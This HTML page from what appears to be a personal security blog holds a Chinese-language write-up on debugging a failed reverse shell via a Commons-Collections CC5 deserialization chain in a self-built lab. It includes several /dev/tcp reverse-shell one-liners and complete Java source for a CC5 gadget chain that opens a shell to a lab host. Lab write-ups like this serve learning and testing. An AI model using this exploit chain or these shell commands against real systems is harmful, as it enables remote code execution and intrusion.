@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="google-site-verification" content="TZE0rZyIqLl10trYu3BWBWa1Vmz6HFwhb2OcNEK4u-s" />
+     <link rel="shortcut icon" href= /img/favicon.ico >
+    <title>
+        Dawn Nine学习笔记
+    </title>
+    <meta name="description" content=  >
+    <meta name="keywords" content= Dawn Nine,代码学习 >
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-home
+ replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            一次CC5反弹shell失败总结
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h1 id="一次CC5反弹shell失败总结"><a href="#一次CC5反弹shell失败总结" class="headerlink" title="一次CC5反弹shell失败总结"></a>一次CC5反弹shell失败总结</h1><h2 id="入手点"><a href="#入手点" class="headerlink" title="入手点"></a>入手点</h2><p>​	领导喊我做一套互联网+内网的靶场，想到了一个比较常见的，任意文件读取+反序列化漏洞RCE，感觉考察点还是比较全面的。在网上找到了<a target="_blank" rel="noopener" href="https://github.com/z1sec/javasec01">javasec01</a>这个师傅写的反序列化靶场。</p>
+<p><img src="/2026/02/19/%E4%B8%80%E6%AC%A1CC5%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5/image-20260219150447228.png" alt="image-20260219150447228"></p>
+<p>​	反编译发现反序列化路由为save_user，传入的b64data参数进行反序列化，用到了commons-co;;ections-3.2.1这个包可以直接打CC1、CC3、CC5、CC6、CC7。根据这个代码在写一个任意文件读取的接口。</p>
+<p><img src="/2026/02/19/%E4%B8%80%E6%AC%A1CC5%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5/image-20260219152734327.png" alt="image-20260219152734327"></p>
+<p>我选择是直接打CC5的链子，链子没问题，直接弹shell，sh -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.3.154&#x2F;9001 0&gt;&amp;1。</p>
+<p><img src="/2026/02/19/%E4%B8%80%E6%AC%A1CC5%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5/image-20260219153303919.png" alt="image-20260219153303919"></p>
+<h2 id="问题出现"><a href="#问题出现" class="headerlink" title="问题出现"></a>问题出现</h2><p>​	发现怎么打都接收不到请求，网络层面是通的，当时考虑是不是不支持sh这样写。因为bash 命令和 sh 命令启动的环境不同，sh 命令如果没有软链接指向 bash，启动的是 dash 环境，而 dash 本身不支持 &#x2F;dev&#x2F;tcp 这种格式的链接重定向。所以换成&#x2F;bin&#x2F;sh -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.3.154&#x2F;9001 0&gt;&amp;1，发现还是不行，进程分析。</p>
+<p><img src="/2026/02/19/%E4%B8%80%E6%AC%A1CC5%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5/image-20260219153936718.png" alt="image-20260219153936718"></p>
+<p>​	发现都没有这个bash进程，当时防火墙关了、端口测试通的、命令测试了可以直接反弹shell</p>
+<p><img src="/2026/02/19/%E4%B8%80%E6%AC%A1CC5%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5/image-20260219154130838.png" alt="image-20260219154130838"></p>
+<p>​	初步怀疑是不是java进程挂了，把java进程kill掉，在看进程发现多了一个sh，而且CPU飙到了100%，看进程对应的程序时刚才执行的反弹shell的命令，网络之间也通。百思不得其解</p>
+<p><img src="/2026/02/19/%E4%B8%80%E6%AC%A1CC5%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5/image-20260219154310834.png" alt="image-20260219154310834"></p>
+<p><img src="/2026/02/19/%E4%B8%80%E6%AC%A1CC5%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5/image-20260219154451714.png" alt="image-20260219154451714"></p>
+<p>​	怀疑是不是kali有问题，还了win11物理机，直接让他反弹到物理机(IP:192.168.3.157)上，还是失败。</p>
+<h2 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h2><p><img src="/2026/02/19/%E4%B8%80%E6%AC%A1CC5%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5/image-20260219154743370.png" alt="image-20260219154743370"></p>
+<p>​	发现还是网络层没有流量，在进程中看到了进程在不停的创建，怎么会没流量。（重复抓包2次结果是一样的）还在想是不是反弹shell的命令不对换了，sh -i 5&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;192.168.3.157&#x2F;6666 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5。</p>
+<p>​	开始回头想这个sh程序是什么时候出现，当java程序在运行的时候这个sh就没出现，当把java程序给关闭，这个程序就出来了，分析了一下这个java程序的进程，猜测会不会java进程阻塞掉了反弹shell的操作。</p>
+<p><img src="/2026/02/19/%E4%B8%80%E6%AC%A1CC5%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5/image-20260219155342649.png" alt="image-20260219155342649"></p>
+<p>​	发现确实是java进程衍生出来了sh这个进程，命令执行是成功的，直接在bash窗口运行这个程序是可以进行反弹shell的。</p>
+<p>问题总结，第一、网络层没有连接175的流量；第二、确实有sh这个进程并且命令执行确实没有问题。</p>
+<h2 id="成功反弹shell原因不清楚"><a href="#成功反弹shell原因不清楚" class="headerlink" title="成功反弹shell原因不清楚"></a>成功反弹shell原因不清楚</h2><p>​	想到了命令注入，会不会一开始执行命令的时候，由于Linux反弹shell的时候要用到特殊字符进行拼接，会不会在传递的过程中出现了偏差导致没有把特殊字符当成参数处理，而是当成了一个文件或者其他的。</p>
+<p>测试了不需要跟特殊字符的命令，mkdir &#x2F;tmp&#x2F;test1。没问题成功执行了</p>
+<p><img src="/2026/02/19/%E4%B8%80%E6%AC%A1CC5%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5/image-20260219160354329.png" alt="image-20260219160354329"></p>
+<p>​	再次尝试&#x2F;bin&#x2F;bash -c ‘echo CC5_triggered &gt; &#x2F;tmp&#x2F;test1&#x2F;test.txt &amp;’进行命令执行，发现遇到问题了。确实没有创建test.txt回到java命令执行。会不会因为这个类Runtime，根据之前写的<a href="https://dawnnine.github.io/2025/12/17/CC6/">CC5</a>把命令执行的类改掉。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.CC5;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] cmd = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;sh -i &gt;&amp; /dev/tcp/192.168.3.157/6666 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(ProcessBuilder.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getConstructor&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String[].class&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newInstance&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;start&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;aa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc5.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        发序列化</span></span><br><span class="line"><span class="comment">//        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;cc5.txt&quot;));</span></span><br><span class="line"><span class="comment">//        ois.readObject();</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;sercc5.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/19/%E4%B8%80%E6%AC%A1CC5%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5/image-20260219162411680.png" alt="image-20260219162411680"></p>
+<p>​	改完以后就成功了，不知道是什么原因。</p>
+
+    </div>
+
+    
+        <hr class="fhr">
+        <div id="vcomments"></div>
+    
+</div>
+    <div class="footer" id="footer">
+    <p><h4>Copyright © 2020 | Author: Dawn Nine | Theme By <a class="theme-author" target="_blank" rel="noopener" href="https://github.com/Xunzhuo/hexo-theme-coder" style="font-size:14px; color: #969696">Coder</a></h4>
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">Page Views: <span id="busuanzi_value_site_pv"></span></span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">Unique Visitors: <span id="busuanzi_value_site_uv"></span></span>
+    
+    <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
+        <input type="checkbox" name="switch" id="update_style">
+        <span class="el-switch-style"></span>
+    </label>
+
+    <!--         <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+    document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script> -->
+</p>
+</div>
+
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="">
+<input type="hidden" id="valine_appKey" value="">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+color: #698fca;
+}
+.v .vlist .vcard .vhead .vsys {
+color: #3a3e4a;
+}
+.v .vlist .vcard .vh .vmeta .vat {
+color: #638fd5;
+}
+.v .vlist .vcard .vhead .vnick {
+color: #6ba1ff;
+}
+.v a {
+color: #8696b1;
+}
+.v .vlist .vcard .vhead .vnick:hover {
+color: #669bfc;
+}
+</style>
+    <script type="text/javascript" color="173,174,173" opacity='1' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
